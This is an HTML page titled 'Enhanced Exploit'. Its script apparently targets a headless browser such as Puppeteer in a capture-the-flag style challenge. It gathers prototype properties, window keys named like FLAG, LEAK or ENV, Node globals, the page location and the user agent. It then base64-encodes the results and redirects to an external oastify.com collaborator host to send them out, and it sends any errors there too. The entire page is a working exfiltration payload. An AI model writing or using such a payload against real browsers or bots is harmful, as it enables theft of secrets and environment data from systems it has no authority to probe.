<!doctype html>
<html>
<body>
<h1>Enhanced Exploit</h1>
<script>
(function() {
    try {
        // Method 1: Check all properties including non-enumerable
        const obj = {};
        const allProps = {};
        
        // Get enumerable inherited properties
        for (let key in obj) {
            allProps[key] = {value: String(obj[key]), enumerable: true};
        }
        
        // Get own property names (even non-enumerable)
        Object.getOwnPropertyNames(Object.prototype).forEach(prop => {
            if (!allProps[prop]) {
                try {
                    allProps[prop] = {value: String(Object.prototype[prop]), enumerable: false};
                } catch(e) {}
            }
        });
        
        // Method 2: Check window object for injected properties
        const windowProps = {};
        for (let key in window) {
            if (key.includes('FLAG') || key.includes('LEAK') || key.includes('ENV')) {
                windowProps[key] = String(window[key]);
            }
        }
        
        // Method 3: Check for special puppeteer-injected properties
        const specialChecks = {
            __dirname: typeof __dirname !== 'undefined' ? __dirname : null,
            __filename: typeof __filename !== 'undefined' ? __filename : null,
            process: typeof process !== 'undefined' ? 'EXISTS' : null,
            require: typeof require !== 'undefined' ? 'EXISTS' : null,
            global: typeof global !== 'undefined' ? 'EXISTS' : null
        };
        
        const data = {
            allProps: allProps,
            windowProps: windowProps,
            specialChecks: specialChecks,
            location: location.href,
            userAgent: navigator.userAgent
        };
        
        // Exfiltrate
        const encoded = btoa(JSON.stringify(data));
        location.href = 'https://g7ojoo6wfdb8f0dltts12kjkzb52t5hu.oastify.com/?enhanced=' + encoded;
        
    } catch(e) {
        location.href = 'https://g7ojoo6wfdb8f0dltts12kjkzb52t5hu.oastify.com/?error=' + btoa(String(e));
    }
})();
</script>
</body>
</html>
